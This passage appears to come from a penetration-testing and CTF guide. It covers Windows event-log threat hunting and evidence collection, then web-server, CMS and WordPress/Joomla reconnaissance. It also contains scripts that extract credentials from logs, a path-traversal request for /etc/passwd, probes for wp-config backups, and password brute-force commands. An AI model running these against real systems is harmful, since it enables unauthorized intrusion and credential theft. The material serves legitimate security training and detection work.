Get-WinEvent -ListLog "Microsoft-Windows-Sysmon/Operational" -ErrorAction SilentlyContinue

# Check Sysmon configuration file location (if accessible)
Get-ChildItem -Path C:\Windows\ -Filter sysmon*.xml -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ProgramData\ -Filter sysmon*.xml -Recurse -ErrorAction SilentlyContinue
```

### Credential Exposure in Event Logs

**Extracting Credentials from Logs**

```powershell
# PowerShell Script Block Logging often captures credentials
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4104} | 
Where-Object {$_.Message -match "ConvertTo-SecureString|SecureString|Get-Credential"} | 
ForEach-Object {
    $_.Properties[2].Value
}

# Search for plaintext passwords in all logs
$LogNames = Get-WinEvent -ListLog * | Select-Object -ExpandProperty LogName
foreach ($LogName in $LogNames) {
    try {
        Get-WinEvent -LogName $LogName -MaxEvents 100 -ErrorAction SilentlyContinue | 
        Where-Object {$_.Message -match "password\s*[:=]\s*\S+"} | 
        Select-Object LogName, TimeCreated, Message
    } catch {}
}

# Command-line arguments with credentials
Get-WinEvent -LogName Security -FilterHashtable @{ID=4688} | 
ForEach-Object {
    $xml = [xml]$_.ToXml()
    $cmdline = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'CommandLine'} | Select-Object -ExpandProperty '#text'
    
    if ($cmdline -match "-p\s+\S+|/p:\S+|password\s*=\s*\S+|pwd\s*=\s*\S+") {
        [PSCustomObject]@{
            Time = $_.TimeCreated
            CommandLine = $cmdline
        }
    }
}

# Registry operations with credentials
Get-WinEvent -LogName Security -FilterHashtable @{ID=4657} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "password|credential"}

# Scheduled task creation with credentials
Get-WinEvent -LogName Security -FilterHashtable @{ID=4698} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "password"}
```

**Historical User Activity Reconstruction**

```powershell
# Build user activity profile
param(
    [string]$TargetUser = "administrator"
)

$StartTime = (Get-Date).AddDays(-7)
$Report = @()

# Logon activity
$Logons = Get-WinEvent -LogName Security -FilterHashtable @{ID=4624; StartTime=$StartTime} | 
ForEach-Object {
    $xml = [xml]$_.ToXml()
    $user = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'
    $logonType = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonType'} | Select-Object -ExpandProperty '#text'
    $sourceIP = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'
    
    if ($user -eq $TargetUser) {
        [PSCustomObject]@{
            Time = $_.TimeCreated
            Activity = "Logon (Type $logonType)"
            Details = "Source: $sourceIP"
        }
    }
}
$Report += $Logons

# Process execution
$Processes = Get-WinEvent -LogName Security -FilterHashtable @{ID=4688; StartTime=$StartTime} -ErrorAction SilentlyContinue | 
ForEach-Object {
    $xml = [xml]$_.ToXml()
    $user = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SubjectUserName'} | Select-Object -ExpandProperty '#text'
    $process = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'NewProcessName'} | Select-Object -ExpandProperty '#text'
    $cmdline = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'CommandLine'} | Select-Object -ExpandProperty '#text'
    
    if ($user -eq $TargetUser) {
        [PSCustomObject]@{
            Time = $_.TimeCreated
            Activity = "Process Creation"
            Details = "$process | $cmdline"
        }
    }
}
$Report += $Processes

# PowerShell execution
$PSActivity = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4104; StartTime=$StartTime} -ErrorAction SilentlyContinue | 
Select-Object @{Name="Time";Expression={$_.TimeCreated}}, 
              @{Name="Activity";Expression={"PowerShell Execution"}}, 
              @{Name="Details";Expression={$_.Properties[2].Value}}
$Report += $PSActivity

# Sort and display timeline
$Report | Sort-Object Time | Format-Table -AutoSize -Wrap
$Report | Sort-Object Time | Export-Csv -Path "user_activity_$TargetUser.csv" -NoTypeInformation
```

### Advanced Threat Hunting Queries

**Hunting for Kerberoasting**

```powershell
# Event ID 4769 - Kerberos Service Ticket Request
Get-WinEvent -LogName Security -FilterHashtable @{ID=4769} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $ticketOptions = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TicketOptions'} | Select-Object -ExpandProperty '#text'
    $ticketEncryption = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TicketEncryptionType'} | Select-Object -ExpandProperty '#text'
    $serviceName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ServiceName'} | Select-Object -ExpandProperty '#text'
    $accountName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'
    
    # RC4 encryption (0x17) with specific ticket options may indicate Kerberoasting
    if ($ticketEncryption -eq '0x17' -and $serviceName -notmatch '\$') {
        [PSCustomObject]@{
            Time = $_.TimeCreated
            Account = $accountName
            ServiceName = $serviceName
            TicketEncryption = $ticketEncryption
            TicketOptions = $ticketOptions
        }
    }
}
```

**Hunting for Golden/Silver Tickets**

```powershell
# Event ID 4624 with unusual characteristics
Get-WinEvent -LogName Security -FilterHashtable @{ID=4624} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $logonType = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonType'} | Select-Object -ExpandProperty '#text'
    $authPackage = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'AuthenticationPackageName'} | Select-Object -ExpandProperty '#text'
    $logonProcess = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonProcessName'} | Select-Object -ExpandProperty '#text'
    $user = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'
    
    # Kerberos logon (Type 3) without pre-authentication may indicate forged ticket
    # [Inference] This pattern requires correlation with Event ID 4768 absence
    if ($logonType -eq '3' -and $authPackage -eq 'Kerberos') {
        [PSCustomObject]@{
            Time = $_.TimeCreated
            User = $user
            LogonType = $logonType
            AuthPackage = $authPackage
            LogonProcess = $logonProcess
        }
    }
}

# Event ID 4768 - TGT Request (should precede 4624 for legitimate Kerberos)
# Absence of 4768 before 4624 Kerberos logon = potential Golden Ticket
```

**Hunting for DCSync Attacks**

```powershell
# Event ID 4662 - Directory Service Access
# DCSync uses DS-Replication-Get-Changes rights
Get-WinEvent -LogName Security -FilterHashtable @{ID=4662} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $accessMask = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'AccessMask'} | Select-Object -ExpandProperty '#text'
    $properties = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Properties'} | Select-Object -ExpandProperty '#text'
    $subjectUser = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SubjectUserName'} | Select-Object -ExpandProperty '#text'
    
    # DCSync-related GUIDs
    # 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes
    # 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes-All
    if ($properties -match "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") {
        [PSCustomObject]@{
            Time = $_.TimeCreated
            User = $subjectUser
            Properties = $properties
        }
    }
}
```

**Hunting for Persistence Mechanisms**

```powershell
# Scheduled task creation (Event ID 4698)
Get-WinEvent -LogName Security -FilterHashtable @{ID=4698} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        TaskName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TaskName'} | Select-Object -ExpandProperty '#text'
        TaskContent = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TaskContent'} | Select-Object -ExpandProperty '#text'
    }
}

# Service installation (Event ID 7045)
Get-WinEvent -LogName System -FilterHashtable @{ID=7045} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ServiceName = $xml.Event.EventData.Data[0].'#text'
        ImagePath = $xml.Event.EventData.Data[1].'#text'
        ServiceType = $xml.Event.EventData.Data[2].'#text'
        ServiceAccount = $xml.Event.EventData.Data[4].'#text'
    }
} | Where-Object {$_.ImagePath -match "powershell|cmd|wscript|cscript|rundll32"}

# Registry persistence (Sysmon Event ID 13)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=13} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}
```

**Hunting for Lateral Movement Tools**

```powershell
# Detect PsExec usage
# - Service name: PSEXESVC
# - Named pipe: \PSEXESVC
# - File: PSEXESVC.exe in ADMIN$

# Service creation with PSEXE pattern
Get-WinEvent -LogName System -FilterHashtable @{ID=7045} | 
Where-Object {$_.Message -match "PSEXE"}

# Named pipe creation (Sysmon Event ID 17/18)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=17,18} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "\\\\\.\\pipe\\(PSEXESVC|[a-f0-9]{8}|svcctl)"}

# Process creation from ADMIN$ share
Get-WinEvent -LogName Security -FilterHashtable @{ID=4688} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "\\\\Windows\\PSEXESVC"}

# Detect Impacket tools
Get-WinEvent -LogName Security -FilterHashtable @{ID=4688} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "__PYVENV_LAUNCHER__|python.*impacket"}

# WMI execution detection
Get-WinEvent -LogName Security -FilterHashtable @{ID=4688} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "Parent.*wmiprvse\.exe"}
```

### Event Log Analysis for CTF Scenarios

**CTF-Specific Hunting Patterns**

```powershell
# Search for flag formats
$FlagPatterns = @(
    "flag\{[^\}]+\}",
    "HTB\{[^\}]+\}",
    "THM\{[^\}]+\}",
    "CTF\{[^\}]+\}",
    "[0-9a-f]{32}",  # MD5-like
    "[0-9a-f]{40}"   # SHA1-like
)

$LogNames = @("Security", "System", "Application", "Microsoft-Windows-PowerShell/Operational")

foreach ($LogName in $LogNames) {
    Write-Host "[*] Searching $LogName"
    Get-WinEvent -LogName $LogName -MaxEvents 1000 -ErrorAction SilentlyContinue | 
    ForEach-Object {
        foreach ($pattern in $FlagPatterns) {
            if ($_.Message -match $pattern) {
                [PSCustomObject]@{
                    Log = $LogName
                    Time = $_.TimeCreated
                    EventID = $_.Id
                    Match = $Matches[0]
                    Message = $_.Message
                }
            }
        }
    }
}

# Check for encoded data in logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4104} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "[A-Za-z0-9+/]{50,}={0,2}"} | 
ForEach-Object {
    $encoded = [regex]::Match($_.Message, "[A-Za-z0-9+/]{50,}={0,2}").Value
    try {
        $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
        [PSCustomObject]@{
            Time = $_.TimeCreated
            Encoded = $encoded.Substring(0, [Math]::Min(50, $encoded.Length))
            Decoded = $decoded
        }
    } catch {}
}
```

**Reconstruct Attack Chain**

```powershell
# Comprehensive attack reconstruction
param(
    [datetime]$StartTime = (Get-Date).AddHours(-24),
    [datetime]$EndTime = (Get-Date)
)

$AttackChain = @()

# 1. Initial access (logons)
$InitialAccess = Get-WinEvent -LogName Security -FilterHashtable @{ID=4624; StartTime=$StartTime; EndTime=$EndTime} | 
Select-Object @{Name="Stage";Expression={"1-Initial Access"}}, TimeCreated, @{Name="Details";Expression={"Logon: " + $_.Message.Split("`n")[0]}}
$AttackChain += $InitialAccess

# 2. Execution (process creation)
$Execution = Get-WinEvent -LogName Security -FilterHashtable @{ID=4688; StartTime=$StartTime; EndTime=$EndTime} -ErrorAction SilentlyContinue | 
Select-Object @{Name="Stage";Expression={"2-Execution"}}, TimeCreated, @{Name="Details";Expression={
    $xml = [xml]$_.ToXml()
    "Process: " + ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'NewProcessName'} | Select-Object -ExpandProperty '#text')
}}
$AttackChain += $Execution

# 3. Persistence (service/task creation)
$Persistence = Get-WinEvent -LogName System -FilterHashtable @{ID=7045; StartTime=$StartTime; EndTime=$EndTime} -ErrorAction SilentlyContinue | 
Select-Object @{Name="Stage";Expression={"3-Persistence"}}, TimeCreated, @{Name="Details";Expression={"Service: " + $_.Message.Split("`n")[0]}}
$AttackChain += $Persistence

# 4. Privilege escalation (special privileges)
$PrivEsc = Get-WinEvent -LogName Security -FilterHashtable @{ID=4672; StartTime=$StartTime; EndTime=$EndTime} | 
Select-Object @{Name="Stage";Expression={"4-Privilege Escalation"}}, TimeCreated, @{Name="Details";Expression={"Privileges: " + $_.Message.Split("`n")[0]}}
$AttackChain += $PrivEsc

# 5. Credential access (LSASS access if Sysmon available)
$CredAccess = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=10; StartTime=$StartTime; EndTime=$EndTime} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "lsass"} | 
Select-Object @{Name="Stage";Expression={"5-Credential Access"}}, TimeCreated, @{Name="Details";Expression={"LSASS Access"}}
$AttackChain += $CredAccess

# 6. Lateral movement (explicit credential use)
$LateralMovement = Get-WinEvent -LogName Security -FilterHashtable @{ID=4648; StartTime=$StartTime; EndTime=$EndTime} | 
Select-Object @{Name="Stage";Expression={"6-Lateral Movement"}}, TimeCreated, @{Name="Details";Expression={"Explicit Cred Use: " + $_.Message.Split("`n")[0]}}
$AttackChain += $LateralMovement

# Display timeline
$AttackChain | Sort-Object TimeCreated | Format-Table -AutoSize
$AttackChain | Sort-Object TimeCreated | Export-Csv -Path "attack_chain.csv" -NoTypeInformation
```

### Event Log Collection and Preservation

**Evidence Collection Best Practices**

```powershell
# Create evidence collection package
$OutputDir = "C:\Evidence_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -ItemType Directory -Path $OutputDir -Force

# Export key logs
$LogsToExport = @("Security", "System", "Application", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Sysmon/Operational")

foreach ($log in $LogsToExport) {
    try {
        $filename = $log -replace "/", "_"
        wevtutil epl $log "$OutputDir\$filename.evtx"
        Write-Host "[+] Exported $log"
    } catch {
        Write-Host "[-] Failed to export $log : $_"
    }
}

# Export registry keys (persistence locations)
$RegistryKeys = @(
    "HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
)

foreach ($key in $RegistryKeys) {
    $filename = ($key -replace "\\", "_" -replace ":", "") + ".reg"
    reg export $key "$OutputDir\$filename" /y 2>$null
}

# System information
Get-ComputerInfo | Out-File "$OutputDir\system_info.txt"
Get-Process | Select-Object Name, Id, Path, StartTime | Export-Csv "$OutputDir\processes.csv" -NoTypeInformation
Get-Service | Select-Object Name, Status, StartType, PathName | Export-Csv "$OutputDir\services.csv" -NoTypeInformation
Get-ScheduledTask | Select-Object TaskName, TaskPath, State | Export-Csv "$OutputDir\scheduled_tasks.csv" -NoTypeInformation

# Network connections
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | 
Export-Csv "$OutputDir\network_connections.csv" -NoTypeInformation

# Create hash manifest
Get-ChildItem $OutputDir -Recurse -File | ForEach-Object {
    [PSCustomObject]@{
        File = $_.Name
        SHA256 = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
        Size = $_.Length
        Created = $_.CreationTime
    }
} | Export-Csv "$OutputDir\manifest.csv" -NoTypeInformation

Write-Host "[+] Evidence collection complete: $OutputDir"
```

---

## Key Enumeration Tools Summary

**PowerShell Remoting:**

- **Test-WSMan**: Verify WinRM availability
- **Enter-PSSession**: Interactive remote session
- **Invoke-Command**: Execute commands remotely
- **New-PSSession**: Create persistent sessions
- **Evil-WinRM**: Linux-based WinRM client
- **CrackMapExec**: Multi-protocol enumeration/execution

**Event Log Analysis:**

- **Get-WinEvent**: PowerShell event querying
- **wevtutil**: Command-line log management
- **Chainsaw**: Fast EVTX parsing (Linux)
- **Hayabusa**: Threat hunting timeline tool
- **DeepBlueCLI**: Automated threat detection
- **EvtxECmd**: EVTX to CSV converter

**Critical Event IDs:**

- **4624**: Successful logon (logon types reveal access method)
- **4625**: Failed logon (brute force detection)
- **4648**: Explicit credentials (lateral movement)
- **4672**: Special privileges (admin activity)
- **4688**: Process creation (command execution)
- **4698**: Scheduled task creation (persistence)
- **7045**: Service installation (persistence/lateral movement)
- **4104**: PowerShell script block (full command visibility)
- **Sysmon 1**: Process creation with hashes
- **Sysmon 3**: Network connections
- **Sysmon 10**: Process access (credential dumping)

## Important Operational Notes

**PSRemoting Security:**

- Always use HTTPS (port 5986) when possible to encrypt traffic
- Avoid setting TrustedHosts to "*" - this disables mutual authentication
- Prefer Kerberos authentication in domain environments
- Enable Constrained Language Mode to restrict PowerShell capabilities
- Monitor Event IDs 91, 169 (WinRM) and 4104 (PowerShell) for remote activity

**Event Log Analysis:**

- Correlate multiple event sources for complete attack picture
- Timeline analysis reveals attack sequences and dwell time
- Absence of expected events (e.g., 4768 before Kerberos 4624) may indicate forged tickets
- Log gaps or Event ID 1102 indicate tampering
- PowerShell Script Block Logging (4104) is most detailed but performance-intensive
- Sysmon significantly enhances visibility but requires installation and configuration

**Detection Considerations:**

- PSRemoting generates network logons (Type 3) in Event ID 4624
- Lateral movement creates explicit credential usage events (4648)
- Service-based execution leaves Event ID 7045 artifacts
- WMI execution has minimal event log footprint compared to PSExec
- Credential dumping creates LSASS access events (Sysmon Event 10)

---

**Related Critical Topics:** After Windows enumeration via PSRemoting and event logs, proceed to Active Directory enumeration (BloodHound, PowerView), credential harvesting from memory and files, and exploiting discovered services or misconfigurations for privilege escalation.

---

# Web Application Assessment

## Web Server Identification

### HTTP Header Analysis

**Basic Banner Grabbing**

```bash
# Netcat
nc target.com 80
HEAD / HTTP/1.0

echo -e "HEAD / HTTP/1.0\r\nHost: target.com\r\n\r\n" | nc target.com 80

# cURL
curl -I http://target.com
curl -IL http://target.com  # Follow redirects
curl -I -X OPTIONS http://target.com

# OpenSSL for HTTPS
openssl s_client -connect target.com:443
HEAD / HTTP/1.1
Host: target.com

echo -e "HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n" | openssl s_client -connect target.com:443 -quiet
```

**Detailed Header Inspection**

```bash
# Identify server header
curl -I http://target.com | grep -i server

# All response headers
curl -sI http://target.com

# Custom headers revealing technology
curl -I http://target.com | grep -iE "X-Powered-By|X-AspNet-Version|X-Generator|X-Drupal-Cache|X-Varnish"

# Multiple request methods
for method in GET POST PUT DELETE OPTIONS HEAD TRACE; do
    echo "=== $method ==="
    curl -sI -X $method http://target.com
done
```

**Server-Specific Headers**

```bash
# Apache indicators
Server: Apache/2.4.41 (Unix)
X-Powered-By: PHP/7.4.3

# Nginx indicators
Server: nginx/1.18.0
X-Powered-By: Express

# IIS indicators
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-AspNetMvc-Version: 5.2

# Cloudflare
Server: cloudflare
CF-RAY: xxxxx

# Other indicators
X-Varnish  # Varnish cache
X-Cache    # Various caching systems
Via: 1.1 vegur  # Heroku
```

### Automated Server Detection

**Whatweb**

```bash
# Basic scan
whatweb http://target.com

# Aggressive mode
whatweb -a 3 http://target.com

# Verbose output
whatweb -v http://target.com

# Custom plugins
whatweb --list-plugins
whatweb -p Apache,Nginx,IIS http://target.com

# Output formats
whatweb --log-json=output.json http://target.com
whatweb --log-xml=output.xml http://target.com

# Scan multiple targets
whatweb -i targets.txt

# Through proxy
whatweb --proxy http://127.0.0.1:8080 http://target.com
```

**Wappalyzer (CLI)**

```bash
# Install
npm install -g wappalyzer

# Basic usage
wappalyzer http://target.com

# JSON output
wappalyzer --pretty http://target.com
```

**httprint**

```bash
# Basic scan
httprint -h target.com -s /usr/share/httprint/signatures.txt

# Scan multiple hosts
httprint -i hosts.txt -s /usr/share/httprint/signatures.txt -o output.html

# Thorough scan
httprint -h target.com -s /usr/share/httprint/signatures.txt -P0
```

**Nmap HTTP Detection**

```bash
# HTTP enumeration scripts
nmap -sV -p 80,443 --script=http-enum target.com
nmap -p 80,443 --script=http-server-header target.com
nmap -p 80,443 --script=http-headers target.com
nmap -p 80,443 --script=http-methods target.com
nmap -p 80,443 --script=http-title target.com

# Banner grabbing
nmap -sV --version-intensity 9 -p 80,443 target.com

# All HTTP scripts
nmap -p 80,443 --script "http-*" target.com

# Specific technology detection
nmap -p 80,443 --script=http-wordpress-enum target.com
nmap -p 80,443 --script=http-drupal-enum target.com
nmap -p 80,443 --script=http-joomla-brute target.com
```

### Error-Based Fingerprinting

**Triggering Error Pages**

```bash
# Non-existent pages
curl http://target.com/nonexistent

# Invalid methods
curl -X INVALID http://target.com

# Malformed requests
curl -H "Host: " http://target.com

# Path traversal attempts (to trigger errors)
curl http://target.com/../../../../etc/passwd

# Special characters
curl "http://target.com/<>\"'%;)(&+"

# Force 400/500 errors
curl -H "Transfer-Encoding: chunked" -H "Content-Length: 5" http://target.com
```

**Error Page Analysis**

```bash
# Common error signatures
# Apache: "Apache/X.X.X Server at target.com Port 80"
# Nginx: "nginx/X.X.X"
# IIS: "Server Error in '/' Application" or detailed ASP.NET errors
# Tomcat: "Apache Tomcat/X.X.X"
# WebLogic: "Error 404--Not Found"
# JBoss: "JBoss Web/X.X.X"

# Extract version from errors
curl -s http://target.com/nonexistent | grep -oP '(Apache|nginx|IIS|Tomcat)/[\d\.]+'
```

### HTTP Methods and Options

**Testing Allowed Methods**

```bash
# OPTIONS request
curl -X OPTIONS -i http://target.com
curl -X OPTIONS -i http://target.com/admin

# Test specific methods
for method in GET HEAD POST PUT DELETE TRACE TRACK CONNECT OPTIONS; do
    echo "=== Testing $method ==="
    curl -X $method -I http://target.com 2>&1 | head -1
done

# Dangerous methods
curl -X TRACE -i http://target.com  # XST vulnerability
curl -X TRACK -i http://target.com  # Microsoft equivalent
curl -X PUT -i http://target.com/test.txt -d "test"
curl -X DELETE -i http://target.com/test.txt
```

**WebDAV Detection**

```bash
# Check for WebDAV
curl -X PROPFIND -i http://target.com
curl -X OPTIONS -i http://target.com | grep -i dav

# WebDAV methods
PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK

# davtest tool
davtest -url http://target.com
davtest -auth user:pass -url http://target.com
```

### SSL/TLS Certificate Analysis

**Certificate Information**

```bash
# View certificate
openssl s_client -connect target.com:443 -showcerts

# Extract certificate
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -text

# Certificate details
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -subject -issuer -dates

# Subject Alternative Names (SANs)
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"

# Common Name and Organization
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -subject | grep -oP 'CN\s*=\s*\K[^,]+'
```

**SSLScan**

```bash
# Full SSL/TLS scan
sslscan target.com

# Specific cipher testing
sslscan --no-failed target.com

# XML output
sslscan --xml=output.xml target.com
```

**testssl.sh**

```bash
# Comprehensive SSL/TLS testing
./testssl.sh target.com

# Specific checks
./testssl.sh --protocols target.com
./testssl.sh --server-defaults target.com
./testssl.sh --vulnerable target.com

# Batch testing
./testssl.sh --file hosts.txt
```

### Response Timing and Behavior

**Timing Analysis**

```bash
# Measure response times
time curl -so /dev/null http://target.com

# Multiple requests
for i in {1..10}; do
    time curl -so /dev/null http://target.com 2>&1 | grep real
done

# Using httping
httping -c 10 http://target.com
```

**Response Size Patterns**

```bash
# Content-Length patterns
curl -sI http://target.com | grep -i content-length

# Actual body size
curl -so /dev/null -w '%{size_download}\n' http://target.com

# Compare different endpoints
for path in / /admin /api /login; do
    echo "$path: $(curl -so /dev/null -w '%{size_download}' http://target.com$path)"
done
```

### Technology Stack Fingerprinting

**Client-Side Technologies**

```bash
# Download and analyze HTML
curl -s http://target.com | grep -iE '<script|<link|<meta'

# JavaScript frameworks
curl -s http://target.com | grep -oE '(jquery|angular|react|vue|bootstrap|ember)\.js'

# CSS frameworks
curl -s http://target.com | grep -oE '(bootstrap|foundation|bulma|tailwind)\.css'

# Meta tags
curl -s http://target.com | grep -i '<meta' | grep -iE 'generator|application-name|framework'

# CDN usage
curl -s http://target.com | grep -oE 'https?://[^"'"'"']+\.(cloudflare|akamai|fastly|cloudfront|cdn)'
```

**Server-Side Technologies**

```bash
# Cookie analysis
curl -I http://target.com | grep -i set-cookie

# Session cookie names (technology indicators)
PHPSESSID       # PHP
JSESSIONID      # Java/JSP
ASP.NET_SessionId  # ASP.NET
connect.sid     # Node.js/Express
rack.session    # Ruby/Rack
laravel_session # Laravel
symfony         # Symfony
```

**URL Pattern Analysis**

```bash
# File extensions indicating technology
.php    # PHP
.asp    # Classic ASP
.aspx   # ASP.NET
.jsp    # Java Server Pages
.do     # Java Struts
.action # Java Struts
.jsf    # JavaServer Faces
.py     # Python
.rb     # Ruby
.pl     # Perl
.cfm    # ColdFusion
```

## CMS Detection

### Automated CMS Detection

**CMSmap**

```bash
# General scan
cmsmap http://target.com

# Specific CMS
cmsmap -t http://target.com -f W  # WordPress
cmsmap -t http://target.com -f J  # Joomla
cmsmap -t http://target.com -f D  # Drupal
cmsmap -t http://target.com -f M  # Moodle

# Aggressive enumeration
cmsmap -a http://target.com

# Bruteforce
cmsmap -u admin -p passwords.txt http://target.com
```

**WhatWeb for CMS**

```bash
# CMS-focused scan
whatweb --aggression 3 --plugins WordPress,Joomla,Drupal,Magento http://target.com

# Detailed CMS info
whatweb -v http://target.com | grep -iE 'wordpress|joomla|drupal|cms'
```

**BlindElephant**

```bash
# WordPress detection
BlindElephant.py http://target.com wordpress

# Joomla detection
BlindElephant.py http://target.com joomla

# Drupal detection
BlindElephant.py http://target.com drupal
```

### WordPress Detection and Enumeration

**WPScan**

```bash
# Basic scan
wpscan --url http://target.com

# Enumerate all
wpscan --url http://target.com --enumerate ap,at,tt,cb,dbe,u,m

# Plugin enumeration
wpscan --url http://target.com --enumerate p
wpscan --url http://target.com --enumerate vp  # Vulnerable plugins
wpscan --url http://target.com --plugins-detection aggressive

# Theme enumeration
wpscan --url http://target.com --enumerate t
wpscan --url http://target.com --enumerate vt  # Vulnerable themes

# User enumeration
wpscan --url http://target.com --enumerate u
wpscan --url http://target.com --enumerate u1-100  # First 100 users

# Timthumbs
wpscan --url http://target.com --enumerate tt

# Config backups
wpscan --url http://target.com --enumerate cb

# DB exports
wpscan --url http://target.com --enumerate dbe

# Media IDs
wpscan --url http://target.com --enumerate m1-100

# API token for vulnerability data
wpscan --url http://target.com --api-token YOUR_TOKEN

# Password brute force
wpscan --url http://target.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt

# Stealthy scan
wpscan --url http://target.com --stealthy --random-user-agent

# Through proxy
wpscan --url http://target.com --proxy http://127.0.0.1:8080

# Disable SSL verification
wpscan --url https://target.com --disable-tls-checks

# Output formats
wpscan --url http://target.com -o output.txt
wpscan --url http://target.com -f json -o output.json
```

**Manual WordPress Detection**

```bash
# Common WordPress indicators
curl -s http://target.com | grep -i wp-content
curl -s http://target.com | grep -i wp-includes
curl -s http://target.com/wp-login.php
curl -s http://target.com/readme.html

# WordPress version from meta
curl -s http://target.com | grep -oP '<meta name="generator" content="WordPress \K[\d\.]+'

# Version from RSS feed
curl -s http://target.com/feed/ | grep -oP '<generator>.*WordPress \K[\d\.]+'

# Version from readme
curl -s http://target.com/readme.html | grep -i "version"

# wp-config.php backup attempts
curl -I http://target.com/wp-config.php.bak
curl -I http://target.com/wp-config.php.old
curl -I http://target.com/wp-config.php~
curl -I http://target.com/wp-config.php.save
curl -I http://target.com/.wp-config.php.swp

# Plugin discovery
curl -s http://target.com | grep -oP 'wp-content/plugins/\K[^/]+'

# Theme discovery
curl -s http://target.com | grep -oP 'wp-content/themes/\K[^/]+'

# User enumeration via API
curl -s http://target.com/wp-json/wp/v2/users
curl -s http://target.com/?rest_route=/wp/v2/users

# User enumeration via author pages
for i in {1..10}; do
    curl -sI http://target.com/?author=$i | grep -i location
done

# XML-RPC detection
curl -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' http://target.com/xmlrpc.php

# Upload directory
curl -I http://target.com/wp-content/uploads/
```

**WordPress Vulnerability Scanning**

```bash
# Known vulnerable plugins
wpscan --url http://target.com --enumerate vp --plugins-detection aggressive --api-token TOKEN

# Check specific plugin
curl -s http://target.com/wp-content/plugins/plugin-name/readme.txt

# Common vulnerable plugins to check
vulnerable_plugins=(
    "wp-file-manager"
    "elementor"
    "contact-form-7"
    "wp-live-chat-support"
    "wpvivid-backuprestore"
)

for plugin in "${vulnerable_plugins[@]}"; do
    echo "Checking $plugin..."
    curl -sI "http://target.com/wp-content/plugins/$plugin/readme.txt" | head -1
done
```

### Joomla Detection and Enumeration

**JoomScan**

```bash
# Basic scan
joomscan -u http://target.com

# Enumerate components
joomscan -u http://target.com -ec

# Enumerate templates
joomscan -u http://target.com -et

# Enumerate modules
joomscan -u http://target.com -em

# Full enumeration
joomscan -u http://target.com -ec -et -em
```

**Manual Joomla Detection**

```bash
# Version detection
curl -s http://target.com/administrator/manifests/files/joomla.xml | grep -oP '<version>\K[^<]+'
curl -s http://target.com/language/en-GB/en-GB.xml | grep -oP '<version>\K[^<]+'

